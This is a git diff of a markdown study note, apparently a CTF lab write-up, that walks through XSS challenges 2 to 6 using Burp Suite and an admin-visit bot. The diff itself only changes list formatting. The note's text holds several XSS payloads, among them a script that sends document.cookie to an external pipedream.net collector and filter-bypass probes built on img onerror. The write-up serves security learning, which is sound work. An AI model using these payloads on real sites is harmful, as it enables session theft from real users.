@@ -50,7 +50,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
 ## Part 3. Assignment
 1. Review
 2. XSS CTF <br>
-⋅⋅a. CTF XSS 2
+a. CTF XSS 2
   - Error = Showing the direct sentence on HTML = <script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
   - Check Attack statement on search bar = xss');alert(1);var i=('
   - Check Attack => xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
@@ -59,7 +59,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
   - The GET URL inputs the admin visit URL bar
   - Check the flag on https://public.requestbin.com/
 
-⋅⋅b. CTF XSS 3
+b. CTF XSS 3
   - Error = Showing ID on the URL on the personal information 
   - Check the attack possibility to change the ID on Burp Suite Request
   - Check the attack statement => aaa"/><script>alert(1)</script>
@@ -67,7 +67,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
   - Copy GET URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
 
-⋅⋅c. CTF XSS 4
+c. CTF XSS 4
   - Error = In the board, it is possible to use special characters (<'">).
   - Check the attack possibility of using an attack statement on the board. => <script>alert(1)</script>
   - Filtering "script" and "alert", so using another attack statement => <img src=x onerror=confirm(1)> 
@@ -77,7 +77,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
   - Copy URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
 
-⋅⋅d. CTF XSS 5
+d. CTF XSS 5
   - Error = In the board, it is possible to use special characters (<'">), but it converts &lt;
   - Check the attack possibility of using an attack statement on the board => <script>alert(1)</script>
   - Using the Burp Suite, the website should be intercepted step by step
@@ -87,7 +87,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
   - Open the new post and copy the URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
 
-⋅⋅e. CTF XSS 6
+e. CTF XSS 6
   - Error = When you log in wrong, the alert pops up.
   - Check the attack possibility in the Burp Suite
   - The POST proxy sends to Repeater and changes the method to GET
@@ -97,4 +97,4 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
   - Copy URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
 
-⋅⋅f. CTF XSS Challenge 
+f. CTF XSS Challenge 
